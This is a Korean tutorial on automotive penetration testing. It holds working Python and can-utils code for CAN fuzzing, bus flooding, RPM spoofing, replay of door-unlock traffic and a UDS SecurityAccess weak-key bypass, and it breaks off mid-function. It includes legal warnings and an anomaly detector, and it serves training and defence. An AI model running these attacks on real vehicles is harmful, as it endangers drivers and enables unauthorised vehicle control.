> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 자동차 보안 테스트 — 침투 테스트·퍼징·인증 검증

## 0. 초보자를 위한 개념 이해

### 자동차 보안 테스트란?

자동차 보안 테스트(Automotive Security Testing)는 차량의 전자 시스템(ECU, CAN 버스, 텔레매틱스, 무선 인터페이스 등)에 대한 체계적인 침투 테스트 및 취약점 평가 활동이다. 단순한 소프트웨어 테스트와 달리 물리적 안전에 직결되는 시스템을 다루므로 테스트 환경 격리와 법적 허가가 필수다. ISO/SAE 21434, UNECE WP.29 등 자동차 사이버보안 표준을 기반으로 수행한다.

**왜 배우는가:**
```
[자동차 보안이 중요한 이유]

  소프트웨어 취약점 → 원격 브레이크 비활성화
  OTA 보안 미흡 → 수백만 대 동시 악성 펌웨어
  CAN 버스 무인증 → 차량 내부 누구나 메시지 전송 가능
  Bluetooth 취약점 → 근거리에서 차량 잠금 해제

  [자동차 공격 표면 확장 추이]
  2000년: 단순 OBD 포트
  2010년: Bluetooth, USB 인포테인먼트
  2015년: WiFi, 셀룰러(4G), V2X
  2020년: 5G, OTA, 클라우드 연동, 자율주행 센서
  2025년: SDV(소프트웨어 정의 차량), 통합 플랫폼
```

### 핵심 개념 정리

```
[자동차 보안 테스트 방법론]

1. 위협 모델링 (TARA - Threat Analysis and Risk Assessment)
   ISO/SAE 21434 요구사항
   공격 경로 식별 → 자산 분류 → 위험도 산정

2. 하드웨어 보안 테스트
   - ECU 물리적 접근 (JTAG, UART)
   - CAN 버스 스니핑 및 퍼징
   - 탬퍼 저항성 평가

3. 통신 보안 테스트
   - Bluetooth 페어링 취약점
   - 셀룰러 인터페이스 공격
   - V2X 프로토콜 취약점

4. 소프트웨어 보안 테스트
   - 펌웨어 추출 및 분석
   - 인포테인먼트 시스템 웹 취약점
   - OTA 업데이트 메커니즘 검증

5. 퍼징 (Fuzzing)
   - CAN ID·데이터 무작위 전송
   - UDS 서비스 퍼징
   - DoS 조건 탐지
```

### 필요한 도구 및 환경
- **python-can + SocketCAN**: CAN 버스 통신 및 퍼징
- **can-utils**: `candump`(스니핑), `cansend`(전송), `cangen`(퍼징)
- **PASTA**: Python Automotive Security Testing Automation
- **Wireshark + 자동차 플러그인**: 다중 프로토콜 패킷 분석

### 기초 실습 예제
```python
# pip install python-can
import can
import random
import time

def can_fuzzer(
    interface: str = 'vcan0',
    target_id: int | None = None,
    duration: int = 5
):
    """
    CAN 버스 퍼저: 무작위 CAN 메시지를 전송해 ECU 응답을 탐지한다.
    반드시 가상 CAN(vcan0) 또는 격리된 테스트 환경에서만 사용!
    """
    print(f"[!] 경고: 실제 차량에서 실행 금지!")
    print(f"[*] {interface}에서 CAN 퍼징 시작 ({duration}초)...")

    try:
        bus = can.interface.Bus(interface, bustype='socketcan')
        start_time = time.time()
        sent_count = 0

        while time.time() - start_time < duration:
            # 랜덤 CAN ID (실제 차량 ID 범위 0x000~0x7FF)
            arb_id = target_id if target_id else random.randint(0, 0x7FF)
            # 랜덤 데이터 (0~8 바이트)
            dlc = random.randint(1, 8)
            data = bytes([random.randint(0, 255) for _ in range(dlc)])

            msg = can.Message(
                arbitration_id=arb_id,
                data=data,
                is_extended_id=False
            )
            bus.send(msg)
            sent_count += 1

            # 짧은 응답 대기
            response = bus.recv(timeout=0.01)
            if response:
                print(f"  [!] 응답: ID=0x{response.arbitration_id:03X} "
                      f"데이터={bytes(response.data).hex()}")

            time.sleep(0.001)  # 버스 과부하 방지

        bus.shutdown()
        print(f"[*] 완료: {sent_count}개 메시지 전송")

    except Exception as e:
        print(f"[-] 오류: {e}")

# 사용 예시 (가상 CAN만!)
# can_fuzzer('vcan0', duration=5)
```

---

## 학습 목표

이 문서를 완료하면 다음을 이해하고 실습할 수 있습니다:

- ECU, CAN Bus, OBD-II 등 자동차 내부 네트워크의 기본 개념을 설명할 수 있다
- CAN 프레임 구조(ID, DLC, Data)를 직접 파싱할 수 있다
- 자동차 공격 표면(OBD-II, WiFi, Bluetooth, 셀룰러, V2X)을 파악할 수 있다
- python-can, can-utils, SocketCAN으로 CAN Bus와 상호작용할 수 있다
- CAN 퍼징, 재생 공격, 이상 탐지를 Python으로 구현할 수 있다
- UDS SecurityAccess(0x27) 취약점을 테스트할 수 있다
- 법적·윤리적 자동차 보안 테스트 방법론을 이해한다

---

## 사전 지식: 자동차 내부 네트워크 기초

### ECU(Electronic Control Unit)란?

ECU는 **자동차 안의 컴퓨터들**입니다.

현대 자동차에는 하나의 컴퓨터가 아니라 수십 개에서 100개 이상의 ECU가 들어 있습니다:

| ECU 종류 | 역할 |
|---------|------|
| ECM (Engine Control Module) | 엔진 연료 분사, 점화 타이밍 제어 |
| TCM (Transmission Control Module) | 자동 변속기 제어 |
| ABS Module | 잠김 방지 브레이크 시스템 |
| BCM (Body Control Module) | 도어락, 창문, 조명 제어 |
| ADAS ECU | 자율 주행 보조 (차선 유지, 충돌 경고) |
| IVI (In-Vehicle Infotainment) | 내비게이션, 오디오, 앱 실행 |
| TPMS | 타이어 공기압 모니터링 |

이 ECU들은 서로 통신해야 합니다. 그 통신 채널이 **CAN Bus**입니다.

---

### CAN Bus란?

CAN (Controller Area Network) Bus는 **ECU들이 통신하는 자동차 내부 네트워크**입니다.

회사에 비유하면: 각 부서(ECU)가 사내 인트라넷(CAN Bus)으로 메시지를 주고받는 것과 같습니다.

CAN Bus의 특징:
- **브로드캐스트**: 모든 메시지는 버스에 연결된 모든 ECU가 볼 수 있다
- **인증 없음**: 누가 보낸 메시지인지 확인하는 메커니즘이 없다 ← 보안 약점
- **우선순위**: 낮은 ID가 높은 우선순위 (중재 방식으로 충돌 해결)
- **속도**: 일반 CAN ~1 Mbps, CAN FD ~5 Mbps

```
CAN Bus 물리적 구조:
                          CAN High (+)
ECU1 ─────┬─────┬─────┬──────────────── 종단 저항 (120Ω)
           │     │     │
          ECU2  ECU3  OBD-II 포트
                      (외부 접근점)
                          CAN Low (-)
ECU1 ─────┴─────┴─────┴──────────────── 종단 저항 (120Ω)
```

---

### CAN 프레임 구조

CAN 메시지(프레임)는 매우 단순한 구조입니다:

```
CAN 표준 프레임 (11-bit ID, Classic CAN):
┌──────────┬────────────────┬─────┬──────────────────────────────────┐
│  ID      │  기타 필드      │ DLC │  Data                            │
│ (11 bit) │ (SOF, RTR...) │(4b) │  (0~8 바이트)                     │
└──────────┴────────────────┴─────┴──────────────────────────────────┘

필드 설명:
- ID  (Arbitration ID): 메시지 종류를 나타내는 식별자 (0x000 ~ 0x7FF)
                        예: 0x200 = 엔진 RPM, 0x350 = 속도 정보
- DLC (Data Length Code): 데이터 길이 (0~8 바이트)
- Data: 실제 데이터 (ECU마다 인코딩 방식이 다름)

예시 프레임 (16진수):
  ID: 0x200  DLC: 8  Data: 0F A0 00 00 00 00 00 00
  → ID 0x200에서 오는 8바이트 메시지
  → 예: 첫 2바이트 0x0FA0 = 4000 (RPM × 0.25 = 1000 RPM)
```

CAN 프레임을 직접 파싱하는 예:

```python
def parse_can_frame(arb_id: int, data: bytes) -> str:
    """간단한 CAN 프레임 해석 예시."""
    # 실제 차량에서는 DBC 파일(데이터베이스)로 ID별 인코딩을 정의
    known_ids = {
        0x200: "Engine RPM",
        0x350: "Vehicle Speed",
        0x400: "Brake Pressure",
    }
    name = known_ids.get(arb_id, f"Unknown ID {hex(arb_id)}")
    return f"{name}: {data.hex()}"
```

---

### OBD-II란?

**OBD-II (On-Board Diagnostics II)**: 자동차 진단 포트

> 컴퓨터의 USB 포트처럼, 외부 장치가 자동차 내부 네트워크(CAN)에 접속할 수 있는 표준 포트

```
OBD-II 포트 위치: 대부분 운전석 계기판 아래 (16핀 커넥터)

핀 배치:
  핀 6  = CAN High (High Speed CAN Bus)
  핀 14 = CAN Low  (High Speed CAN Bus)
  핀 16 = 배터리 (+12V)
  핀 4/5 = 접지

용도:
- 정비사: 차량 진단 코드(DTC) 읽기
- 보안 연구자: CAN 트래픽 도청 및 주입
- 공격자: 물리적 접근 시 악성 메시지 주입
```

도구:

```bash
# ELM327 USB 어댑터로 OBD-II 연결 후
# python-OBD 라이브러리 사용
pip install obd

python3 -c "
import obd
connection = obd.OBD()  # 자동으로 ELM327 탐색
cmd = obd.commands.RPM
response = connection.query(cmd)
print(f'RPM: {response.value}')
"
```

---

### 현대 자동차의 공격 표면

```
자동차 공격 표면 전체 지도
    │
    ├── 물리적 접근 (단거리)
    │     ├── OBD-II 포트 (CAN 직접 접근)
    │     ├── USB 포트 (IVI 시스템)
    │     ├── SD 카드 슬롯 (펌웨어 업데이트)
    │     └── JTAG/UART (ECU 직접 디버그)
    │
    ├── 근거리 무선 (수 미터)
    │     ├── Bluetooth (스마트폰 연결, 음악)
    │     ├── Wi-Fi (핫스팟, 소프트웨어 업데이트)
    │     └── TPMS (타이어 압력 센서, 315/433 MHz)
    │
    ├── 중거리 무선
    │     ├── RKE (Remote Keyless Entry, 키 없이 잠금 해제)
    │     └── DSRC (V2X 통신, 교통 신호 등)
    │
    └── 원거리 무선 (인터넷)
          ├── 셀룰러 (4G/5G, 텔레매틱스 서버)
          ├── OTA 업데이트 (소프트웨어 무선 배포)
          └── 앱 연동 (스마트폰 앱 API)
```

**유명 사례: 2015 Jeep Cherokee 원격 해킹**

Charlie Miller와 Chris Valasek 연구원들은 셀룰러 네트워크를 통해:
1. IVI(Uconnect) 시스템에 인터넷으로 접속
2. IVI에서 CAN Bus로 메시지 주입 권한 획득
3. 고속도로 주행 중인 Jeep의 에어컨, 라디오, 와이퍼를 원격 조작
4. 최종적으로 **엔진 정지** 및 **브레이크 비활성화** 시연

결과: Fiat Chrysler가 140만 대를 리콜하고 패치를 배포

이 사례는 자동차 보안이 단순한 IT 보안을 넘어 **생명 안전**에 직결됨을 보여줍니다.

---

## 자동차 보안 테스트 방법론

### 법적 고려사항

> 경고: 자동차 보안 테스트는 반드시 서면 허가가 있어야 합니다.

```
합법적 테스트 환경:
  ✓ 자신이 소유한 차량 (단, 개조 후 공도 주행은 별도 법규 확인)
  ✓ 제조사/연구소의 서면 계약 하에 수행
  ✓ 격리된 CANbus 시뮬레이터/테스트벤치 사용
  ✓ 인증된 자동차 보안 실험실

불법/위험한 행위:
  ✗ 타인 차량에 무단 접근
  ✗ 공도 주행 중 CAN 메시지 주입
  ✗ 원격 무선 공격 (제조사 허가 없이)
  ✗ 안전 기능(ABS, 에어백, 브레이크) 비활성화 테스트 (실차에서)
```

### 테스트 환경 구성

**옵션 1: 실제 차량 + 정적 환경**

```bash
# 필요 장비:
# - ELM327 USB 어댑터 (OBD-II → USB)
# - Raspberry Pi 또는 노트북
# - python-can, can-utils 설치

# SocketCAN 인터페이스 설정 (ELM327 어댑터)
sudo modprobe can
sudo modprobe can_raw
sudo modprobe slcan

# slcand로 ELM327을 SocketCAN으로 연결
sudo slcand -o -s6 -t hw -S 3000000 /dev/ttyUSB0
sudo ip link set slcan0 up

# candump으로 실시간 CAN 트래픽 도청
candump slcan0
```

**옵션 2: 가상 CAN (vcan) — 하드웨어 없이 테스트**

```bash
# 커널 모듈 로드
sudo modprobe vcan

# 가상 CAN 인터페이스 생성
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# 동작 확인: 터미널 1에서 수신
candump vcan0

# 터미널 2에서 테스트 메시지 전송
cansend vcan0 123#DEADBEEF
```

---

## CAN Bus 공격 유형

### 1. CAN Flooding (DoS 공격)

CAN Bus에 고속으로 메시지를 주입해 정상 통신을 방해합니다:

```python
#!/usr/bin/env python3
"""CAN Bus DoS 공격 시뮬레이션 (테스트 환경 전용)."""

import time
import can


def can_flood(interface: str = "vcan0", target_id: int = 0x000, duration: float = 5.0) -> int:
    """지정 ID로 고속 메시지 주입 (DoS)."""
    bus = can.interface.Bus(interface, bustype="socketcan")
    msg = can.Message(
        arbitration_id=target_id,
        data=b"\xFF" * 8,
        is_extended_id=False,
    )

    count = 0
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            bus.send(msg)
            count += 1
        except can.CanError:
            break

    bus.shutdown()
    print(f"[+] {duration}초 동안 {count}개 프레임 주입")
    return count
```

### 2. CAN Spoofing (위조 메시지 주입)

합법적인 ECU 메시지를 위조해 차량 동작을 조작합니다:

```python
def inject_spoofed_rpm(interface: str = "vcan0", target_rpm: int = 3000) -> None:
    """
    엔진 RPM 위조 메시지 주입 예시.
    실제 차량에서는 계기판이 잘못된 RPM을 표시할 수 있음.
    """
    bus = can.interface.Bus(interface, bustype="socketcan")

    # RPM 인코딩: 값 × 0.25 → raw (차량마다 다름, DBC 파일 참조)
    rpm_raw = int(target_rpm / 0.25)
    data = rpm_raw.to_bytes(2, "big") + b"\x00" * 6

    msg = can.Message(
        arbitration_id=0x200,   # 예시 ID (차량마다 다름)
        data=data,
        is_extended_id=False,
    )
    bus.send(msg)
    bus.shutdown()
    print(f"[*] RPM {target_rpm} 위조 메시지 전송 (raw: {hex(rpm_raw)})")
```

### 3. ECU Replay 공격

정상 트래픽을 캡처 후 재생하여 특정 동작을 반복 실행합니다:

```
캡처 → 저장 → 재생 사이클:

1. candump vcan0 -l capture.log   # 트래픽 캡처
2. 분석: 도어락 해제 시 발생하는 메시지 식별
3. canplayer -I capture.log       # 재생 → 도어락 다시 해제
```

---

## 보안 테스트 도구 소개

### SocketCAN + can-utils

Linux 커널 내장 CAN 스택:

```bash
# 설치 (Ubuntu/Debian)
sudo apt-get install can-utils

# 주요 도구:
candump vcan0                              # 실시간 수신 (모든 프레임)
candump vcan0 | grep " 200 "              # ID 0x200만 필터링
cansend vcan0 200#0FA000000000000         # 단일 프레임 전송
cangen vcan0 -D i -L 8                   # 랜덤 프레임 생성기
canplayer -I logfile.log -I vcan0        # 로그 파일 재생
canbusload vcan0@500000                   # 버스 부하 측정
```

### python-can

Python에서 CAN Bus를 다루는 표준 라이브러리:

```bash
pip install python-can

# 지원 인터페이스: socketcan, kvaser, pcan, vector, ixxat, ...
```

```python
import can

# 수신
bus = can.interface.Bus("vcan0", bustype="socketcan")
message = bus.recv(timeout=2.0)   # 최대 2초 대기
if message:
    print(f"ID: {hex(message.arbitration_id)}, Data: {message.data.hex()}")
bus.shutdown()

# 송신
bus = can.interface.Bus("vcan0", bustype="socketcan")
msg = can.Message(arbitration_id=0x123, data=b"\x01\x02\x03", is_extended_id=False)
bus.send(msg)
bus.shutdown()
```

---

## 2. CAN Bus 퍼징 자동화

```python
#!/usr/bin/env python3
"""CAN Bus 보안 테스트 — 퍼징·재생 공격·이상 탐지.

사용법:
  python3 can_security.py fuzz --start 0x000 --end 0x7FF --iface vcan0
  python3 can_security.py replay capture.log --iface vcan0
  python3 can_security.py monitor --iface vcan0 --duration 60 --baseline baseline.json -o result.json
"""

import argparse
import json
import random
import time
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class CANFrame:
    """CAN 프레임 하나를 표현하는 데이터 클래스."""
    arbitration_id: int        # 11비트 CAN ID (0x000 ~ 0x7FF)
    data: bytes                # 페이로드 (0~8 바이트)
    timestamp: float = field(default_factory=time.time)
    is_extended: bool = False  # True이면 29비트 확장 ID

    def to_dict(self) -> dict:
        return {
            "id": hex(self.arbitration_id),
            "data": self.data.hex(),
            "timestamp": self.timestamp,
            "extended": self.is_extended,
        }


def send_can_frame(frame: CANFrame, interface: str = "vcan0") -> bool:
    """python-can으로 CAN 프레임 전송."""
    try:
        import can
        bus = can.interface.Bus(interface, bustype="socketcan")
        msg = can.Message(
            arbitration_id=frame.arbitration_id,
            data=frame.data,
            is_extended_id=frame.is_extended,
        )
        bus.send(msg)
        bus.shutdown()
        return True
    except Exception as e:
        print(f"전송 실패: {e}")
        return False


def fuzz_can_id_range(
    start_id: int,
    end_id: int,
    data_pattern: bytes | None = None,
    delay: float = 0.01,
    interface: str = "vcan0",
) -> list[CANFrame]:
    """
    CAN ID 범위 퍼징 — 각 ID에 랜덤 데이터 전송.

    Args:
        start_id: 퍼징 시작 CAN ID (포함)
        end_id: 퍼징 종료 CAN ID (포함)
        data_pattern: 고정 데이터 (None이면 랜덤 생성)
        delay: 프레임 간 대기 시간 (초). 너무 빠르면 버스 과부하
        interface: SocketCAN 인터페이스 이름

    Returns:
        전송된 CANFrame 리스트
    """
    sent = []
    total = end_id - start_id + 1
    print(f"[*] CAN ID {hex(start_id)} ~ {hex(end_id)} 퍼징 시작 ({total}개)")

    for arb_id in range(start_id, end_id + 1):
        # data_pattern이 없으면 8바이트 완전 랜덤 데이터 생성
        data = data_pattern or bytes([random.randint(0, 255) for _ in range(8)])
        frame = CANFrame(arbitration_id=arb_id, data=data)
        print(f"[>] CAN ID {hex(arb_id):6s}: {data.hex()}")
        send_can_frame(frame, interface)
        sent.append(frame)
        time.sleep(delay)  # ECU 과부하 방지

    print(f"\n[+] 퍼징 완료: {len(sent)}개 프레임 전송")
    return sent


def replay_can_log(log_file: Path, interface: str = "vcan0", speed: float = 1.0) -> int:
    """
    캡처된 CAN 로그 재생 (candump 형식 지원).

    candump 로그 형식:
      (1234567890.123456) vcan0 200#0FA000000000000

    Args:
        log_file: candump으로 캡처한 로그 파일 경로
        interface: 재생할 CAN 인터페이스
        speed: 재생 속도 (1.0=실시간, 2.0=2배속, 0.5=절반 속도)
    """
    frames: list[tuple[float, CANFrame]] = []

    with log_file.open() as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            # candump 형식 파싱: (timestamp) interface ID#data
            parts = line.split()
            if len(parts) >= 3:
                try:
                    ts = float(parts[0].strip("()"))
                    # ID#data 형식 파싱
                    arb_id_str, _, data_hex = parts[2].partition("#")
                    arb_id = int(arb_id_str, 16)
                    # 최대 8바이트 (16 hex 문자)
                    data = bytes.fromhex(data_hex[:16])
                    frames.append((ts, CANFrame(arb_id, data, ts)))
                except (ValueError, IndexError):
                    continue

    if not frames:
        print("[-] 유효한 프레임 없음")
        return 0

    print(f"[*] {len(frames)}개 프레임 재생 시작 (속도: {speed}x)")
    start_ts = frames[0][0]
    start_time = time.time()

    for orig_ts, frame in frames:
        # 원본 타임스탬프 기준으로 대기 (속도 배율 적용)
        elapsed_orig = (orig_ts - start_ts) / speed
        elapsed_real = time.time() - start_time
        sleep_time = elapsed_orig - elapsed_real
        if sleep_time > 0:
            time.sleep(sleep_time)
        send_can_frame(frame, interface)

    return len(frames)


def monitor_can_anomalies(
    interface: str = "vcan0",
    duration: int = 60,
    baseline_file: Path | None = None,
) -> dict:
    """
    CAN 트래픽 모니터링 — 베이스라인 대비 이상 탐지.

    이상 탐지 기준:
    1. 기존 ID의 주파수가 베이스라인 대비 50% 이상 변화
    2. 베이스라인에 없는 신규 ID가 100Hz 이상 고빈도로 나타남

    Args:
        interface: 모니터링할 CAN 인터페이스
        duration: 모니터링 시간 (초)
        baseline_file: 정상 트래픽 베이스라인 JSON 파일 (선택)
    """
    try:
        import can
    except ImportError:
        print("python-can 설치 필요: pip install python-can")
        return {}

    # 베이스라인 로드 (있으면)
    baseline: dict[str, dict] = {}
    if baseline_file and baseline_file.exists():
        baseline = json.loads(baseline_file.read_text())
        print(f"[*] 베이스라인 로드: {len(baseline)}개 ID")

    bus = can.interface.Bus(interface, bustype="socketcan")
    id_stats: dict[int, dict] = {}
    start = time.time()

    print(f"[*] {interface} 모니터링 중 ({duration}초)...")
    try:
        while time.time() - start < duration:
            msg = bus.recv(timeout=1.0)
            if not msg:
                continue
            arb_id = msg.arbitration_id
            if arb_id not in id_stats:
                id_stats[arb_id] = {"count": 0, "last_data": [], "freq_hz": 0}
            id_stats[arb_id]["count"] += 1
            id_stats[arb_id]["last_data"] = list(msg.data)
    except KeyboardInterrupt:
        print("\n[*] 사용자 중단")
    finally:
        bus.shutdown()

    elapsed = time.time() - start
    anomalies = []

    for arb_id, stats in id_stats.items():
        freq = stats["count"] / elapsed
        stats["freq_hz"] = round(freq, 2)
        hex_id = hex(arb_id)

        # 베이스라인과 비교
        if hex_id in baseline:
            base_freq = baseline[hex_id].get("freq_hz", 0)
            if base_freq > 0 and abs(freq - base_freq) / base_freq > 0.5:
                anomalies.append({
                    "id": hex_id,
                    "issue": f"주파수 이상: {freq:.1f}Hz vs 기준 {base_freq:.1f}Hz",
                    "severity": "high" if abs(freq - base_freq) / base_freq > 2 else "medium",
                })
        elif freq > 100:
            # 알려지지 않은 고빈도 ID는 플러딩 공격 의심
            anomalies.append({
                "id": hex_id,
                "issue": f"고빈도 신규 ID: {freq:.1f}Hz (플러딩 의심)",
                "severity": "high",
            })

    result = {
        "duration": round(elapsed, 1),
        "total_ids": len(id_stats),
        "total_frames": sum(s["count"] for s in id_stats.values()),
        "anomalies": anomalies,
        "id_stats": {hex(k): v for k, v in id_stats.items()},
    }

    if anomalies:
        print(f"\n[!] 이상 탐지 {len(anomalies)}건:")
        for a in anomalies:
            print(f"  [{a['severity'].upper()}] {a['id']}: {a['issue']}")
    else:
        print("[+] 이상 없음")

    return result


def main() -> None:
    parser = argparse.ArgumentParser(
        description="CAN Bus 보안 테스트",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  python3 can_security.py fuzz --start 0x000 --end 0x7FF
  python3 can_security.py replay capture.log --speed 2.0
  python3 can_security.py monitor --duration 120 --baseline normal.json -o report.json
""",
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    # fuzz 서브커맨드
    fuzz_p = sub.add_parser("fuzz", help="CAN ID 범위 퍼징")
    fuzz_p.add_argument("--start", type=lambda x: int(x, 16), default=0x000,
                        help="시작 ID (16진수, 기본: 0x000)")
    fuzz_p.add_argument("--end", type=lambda x: int(x, 16), default=0x7FF,
                        help="종료 ID (16진수, 기본: 0x7FF)")
    fuzz_p.add_argument("--iface", default="vcan0", help="CAN 인터페이스")
    fuzz_p.add_argument("--delay", type=float, default=0.01,
                        help="프레임 간 대기 시간 (초, 기본: 0.01)")
    fuzz_p.add_argument("-o", "--output", type=Path, help="결과 저장 JSON 파일")

    # replay 서브커맨드
    replay_p = sub.add_parser("replay", help="CAN 로그 재생")
    replay_p.add_argument("log", type=Path, help="candump 로그 파일")
    replay_p.add_argument("--iface", default="vcan0")
    replay_p.add_argument("--speed", type=float, default=1.0,
                          help="재생 속도 배율 (기본: 1.0 실시간)")

    # monitor 서브커맨드
    monitor_p = sub.add_parser("monitor", help="이상 탐지 모니터링")
    monitor_p.add_argument("--iface", default="vcan0")
    monitor_p.add_argument("--duration", type=int, default=60,
                           help="모니터링 시간 (초, 기본: 60)")
    monitor_p.add_argument("--baseline", type=Path,
                           help="정상 트래픽 베이스라인 JSON")
    monitor_p.add_argument("-o", "--output", type=Path, help="결과 저장 파일")

    args = parser.parse_args()

    match args.cmd:
        case "fuzz":
            frames = fuzz_can_id_range(
                args.start, args.end, delay=args.delay, interface=args.iface
            )
            if args.output:
                args.output.write_text(
                    json.dumps([f.to_dict() for f in frames], indent=2)
                )
                print(f"[+] 결과 저장: {args.output}")

        case "replay":
            count = replay_can_log(args.log, args.iface, args.speed)
            print(f"[+] {count}개 프레임 재생 완료")

        case "monitor":
            result = monitor_can_anomalies(args.iface, args.duration, args.baseline)
            print(f"\n총 ID 수: {result.get('total_ids')}, 총 프레임: {result.get('total_frames')}")
            if args.output:
                args.output.write_text(
                    json.dumps(result, indent=2, ensure_ascii=False)
                )
                print(f"[+] 결과 저장: {args.output}")


if __name__ == "__main__":
    main()
```

---

## 3. UDS 진단 프로토콜 테스트

### UDS(Unified Diagnostic Services)란?

UDS는 **ECU를 진단하고 제어하기 위한 표준 프로토콜**(ISO 14229)입니다.

정비사가 진단기를 연결해 "엔진 오류 코드 확인", "ECU 재플래시" 등을 수행할 때 사용합니다. 보안 관점에서는 권한 없는 ECU 제어의 진입점이 될 수 있습니다.

```
UDS 통신 방식:
  요청자 (진단기/공격자) → [서비스 ID + 데이터] → ECU
  ECU → [긍정 응답: 서비스 ID + 0x40, 데이터] → 요청자
        [부정 응답: 0x7F, 서비스 ID, 오류 코드]

CAN에서는 ISO 15765-2 (ISO-TP) 프로토콜로 전송
```

```python
#!/usr/bin/env python3
"""UDS (Unified Diagnostic Services) 보안 테스트.

사용법:
  python3 uds_test.py --interface vcan0 enum
  python3 uds_test.py --interface vcan0 secaccess --level 0x01
"""

import argparse
import time


# UDS 서비스 ID 정의 (ISO 14229 기준)
UDS_SERVICES = {
    0x10: "DiagnosticSessionControl",    # 진단 세션 변경 (기본/프로그래밍/확장)
    0x11: "ECUReset",                    # ECU 재시작
    0x14: "ClearDiagnosticInformation",  # DTC 삭제
    0x19: "ReadDTCInformation",          # 고장 코드(DTC) 읽기
    0x22: "ReadDataByIdentifier",        # 특정 데이터 읽기 (VIN, 센서값 등)
    0x23: "ReadMemoryByAddress",         # 메모리 직접 읽기 (위험!)
    0x27: "SecurityAccess",              # 보안 잠금 해제 (시드/키 방식)
    0x28: "CommunicationControl",        # CAN 통신 활성화/비활성화
    0x2E: "WriteDataByIdentifier",       # 데이터 쓰기
    0x31: "RoutineControl",              # 진단 루틴 실행
    0x34: "RequestDownload",             # 펌웨어 다운로드 시작
    0x36: "TransferData",               # 데이터 전송 (펌웨어 청크)
    0x37: "RequestTransferExit",         # 전송 완료
    0x3D: "WriteMemoryByAddress",        # 메모리 직접 쓰기 (매우 위험!)
    0x3E: "TesterPresent",              # 세션 유지 (타임아웃 방지)
    0x85: "ControlDTCSetting",          # DTC 설정 제어
}

# UDS 진단 세션 타입
UDS_SESSION_TYPES = {
    0x01: "DefaultSession",            # 기본 세션 (제한적 접근)
    0x02: "ProgrammingSession",        # 프로그래밍 세션 (펌웨어 업데이트 가능)
    0x03: "ExtendedDiagnosticSession", # 확장 세션 (더 많은 서비스 접근)
}

# UDS 부정 응답 코드 (NRC)
UDS_NRC = {
    0x10: "generalReject",
    0x11: "serviceNotSupported",
    0x12: "subFunctionNotSupported",
    0x13: "incorrectMessageLengthOrInvalidFormat",
    0x22: "conditionsNotCorrect",
    0x24: "requestSequenceError",
    0x31: "requestOutOfRange",
    0x33: "securityAccessDenied",
    0x35: "invalidKey",
    0x36: "exceededNumberOfAttempts",
    0x37: "requiredTimeDelayNotExpired",
}


def build_uds_request(
    service_id: int,
    sub_func: int | None = None,
    data: bytes = b"",
) -> bytes:
    """UDS 요청 페이로드 빌드."""
    payload = bytes([service_id])
    if sub_func is not None:
        payload += bytes([sub_func])
    payload += data
    return payload


def parse_uds_response(response: bytes) -> dict:
    """UDS 응답 파싱."""
    if not response:
        return {"type": "timeout", "raw": ""}

    first_byte = response[0]

    if first_byte == 0x7F:
        # 부정 응답: [0x7F] [서비스 ID] [NRC]
        svc = response[1] if len(response) > 1 else 0
        nrc = response[2] if len(response) > 2 else 0
        return {
            "type": "negative",
            "service": hex(svc),
            "nrc": hex(nrc),
            "nrc_desc": UDS_NRC.get(nrc, "unknown"),
            "raw": response.hex(),
        }
    else:
        # 긍정 응답: 서비스 ID + 0x40 = 응답 코드
        return {
            "type": "positive",
            "response_id": hex(first_byte),
            "service": hex(first_byte - 0x40),
            "data": response[1:].hex(),
            "raw": response.hex(),
        }


def enumerate_uds_services(
    send_fn,              # Callable[[bytes], bytes | None]
    timeout: float = 0.5,
) -> list[dict]:
    """모든 UDS 서비스 ID 열거 (0x00~0xFF 순서대로 시도)."""
    available = []
    print("[*] UDS 서비스 ID 열거 시작...")

    for svc_id in range(0x00, 0xFF):
        request = build_uds_request(svc_id)
        response = send_fn(request)

        if response and len(response) >= 1:
            parsed = parse_uds_response(response)
            # 부정 응답 중 "serviceNotSupported"(0x11)가 아닌 것은 서비스 존재
            if parsed["type"] == "positive" or (
                parsed["type"] == "negative"
                and parsed.get("nrc") not in ("0x11",)
            ):
                svc_name = UDS_SERVICES.get(svc_id, f"Unknown_0x{svc_id:02X}")
                available.append({
                    "service_id": hex(svc_id),
                    "name": svc_name,
                    "response": response.hex(),
                    "status": parsed["type"],
                })
                print(f"  [+] {hex(svc_id):4s} ({svc_name}): {parsed['type']}")

        time.sleep(timeout)

    print(f"\n[+] 발견된 서비스: {len(available)}개")
    return available


def test_security_access(
    send_fn,
    level: int = 0x01,
) -> dict:
    """
    UDS SecurityAccess (0x27) — 시드·키 검증 및 약한 알고리즘 시도.

    UDS SecurityAccess 프로토콜:
    1. 요청자 → ECU: 0x27 0x01 (시드 요청, level=1)
    2. ECU → 요청자: 0x67 0x01 [SEED] (4바이트 시드)
    3. 요청자 → ECU: 0x27 0x02 [KEY]  (키 계산 후 전송)
    4. ECU → 요청자: 0x67 0x02 (성공) 또는 0x7F 0x27 0x35 (잘못된 키)
    """
    result: dict = {"level": hex(level), "seed": None, "bypassed": False}

    # 1단계: 시드 요청
    seed_req = build_uds_request(0x27, level)  # 0x27 01
    print(f"[*] SecurityAccess level {hex(level)} 시드 요청: {seed_req.hex()}")

    seed_resp = send_fn(seed_req)

    if not seed_resp or seed_resp[0] != 0x67:
        print(f"[-] 시드 요청 실패: {seed_resp.hex() if seed_resp else 'no response'}")
        return result

    # 응답: 0x67 [level] [SEED bytes...]
    seed = seed_resp[2:]
    result["seed"] = seed.hex()
    print(f"[+] 시드 수신: {seed.hex()}")

    # 2단계: 약한 키 알고리즘 시도
    # 실제 ECU들 중 일부는 취약한 알고리즘을 사용
    weak_keys = [
        (bytes([0x00] * len(seed)), "전체 0"),
        (bytes([0xFF] * len(seed)), "전체 0xFF"),
        (bytes(b ^ 0xFF for b in seed), "비트 반전"),
        (seed, "시드 그대로"),
        (seed[::-1], "시드 역순"),
        (bytes((b + 1) & 0xFF for b in seed), "시드 +1"),
    ]

    for key, description in weak_keys:
        # 키 전송: 0x27 [level+1] [KEY]
        key_req = build_uds_request(0x27, level + 1, key)
        print(f"  [*] 키 시도 ({description}): {key.hex()}")

        key_resp = send_fn(key_req)
